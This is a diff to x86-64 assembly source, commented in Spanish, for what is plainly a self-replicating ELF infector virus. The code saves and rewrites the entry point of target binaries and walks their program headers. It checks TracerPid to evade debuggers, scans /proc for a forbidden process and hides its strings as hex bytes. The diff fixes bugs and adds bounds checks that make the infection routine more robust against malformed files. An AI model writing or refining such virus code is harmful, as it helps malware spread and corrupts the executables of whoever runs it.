@@ -734,7 +734,7 @@ section .text
         ; esto puede pasar a menudo por permisos. Si sucede, seguimos.
         jle .cleanup_and_check_dir_in_proc
 
-        lea rdi, [forbidden_prog + forbidden_prog_len]
+        lea rdi, [forbidden_prog + forbidden_prog_len - 1]
         ; apuntamos con rsi al ultimo caracter de la cadena devuelta por readlink
         CALL_ENCRYPT(crazy)
         add rsi, rax
@@ -912,8 +912,6 @@ section .text
         cmp eax, S_IFREG            ; reg file type
         jne .close_file
         mov rax, [rsp + 48]
-        cmp rax, 64                 ; check tamaño del fichero
-        jle .close_file
         mov dword VAR(Death.file_original_len), eax
 
         jmp .check_ehdr
@@ -932,6 +930,10 @@ section .text
         mov rdx, Elf64_Ehdr_size
         mov rax, SC_READ
         syscall
+
+        ; si no podemos leer ni el ehdr, out
+        cmp rax, Elf64_Ehdr_size
+        jne .check_ehdr_error
 
         cmp dword [rsp], MAGIC_NUMBERS      ; magic number
         jne .check_ehdr_error
@@ -957,11 +959,20 @@ section .text
         mov VAR(Death.mmap_ptr), rax   ; save mmap_ptr
 
     .check_infect:
-        mov rcx, dword _finish - Traza
+        ; rax -> puntero a inicio mmap
         mov rsi, rax
+
+        ; Caso en el que
         mov ebx, dword VAR(Death.file_original_len)
+        cmp rbx, _finish - Traza
+        jle .munmap
+
+        ; rbx -> file_original_len - (address(_finish) - address(Traza))
+        sub rbx, _finish - Traza
+        cmp rbx, VAR(Death.file_original_len)
+
+        ; rsi se situa donde estaría la traza en caso de haber sido infectado
         add rsi, rbx
-        sub rsi, rcx
         lea rdi, Traza
         mov rcx, Traza_len
         cld                 ; incremental
@@ -970,9 +981,14 @@ section .text
 
     .infect:
         mov rbx, [rax + Elf64_Ehdr.e_entry]         ; rbx = &(rax + e_entry)
-        mov VAR(Death.original_entry), rbx     ; save original_entry
-        lea rbx, [rax + Elf64_Ehdr.e_phoff]         ; rbx = &(rax + e_phoff)
-        mov rbx, [rbx]                              ; rbx = rax + *(rbx)
+        mov VAR(Death.original_entry), rbx          ; save original_entry
+        mov rbx, [rax + Elf64_Ehdr.e_phoff]         ; rbx = *(rax + e_phoff)
+
+		; el phoff apunta fuera del fichero
+        cmp rbx, Death.file_original_len
+        jge .munmap
+
+		; rbx = map + e_phoff
         add rbx, rax
         movzx eax, word [rax + Elf64_Ehdr.e_phnum]
         ; initialize variables seeked in loop header
@@ -1187,8 +1203,8 @@ section .text
     __F_data:
     tracerPid_str   db      0x54,0x72,0x61,0x63,0x65,0x72,0x50,0x69,0x64,0x3A,0x9  ;"TracerPid:",0x9 ; 11
     status_file     db      0x2F,0x70,0x72,0x6F,0x63,0x2F,0x73,0x65,0x6C,0x66,0x2F,0x73,0x74,0x61,0x74,0x75,0x73,0 ;"/proc/self/status",0 ; 18
-    forbidden_prog  db      "/vim.basic"
-    forbidden_prog_len equ  $ - forbidden_prog - 1
+    forbidden_prog  db      "/vim"
+    forbidden_prog_len equ  $ - forbidden_prog
     exe_string      db      0x2F,0x65,0x78,0x65,0 ;"/exe",0 ; 5
     dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
     proc            db      0x2F,0x70,0x72,0x6F,0x63,0x2f,0 ; "/proc/",0 ; 7
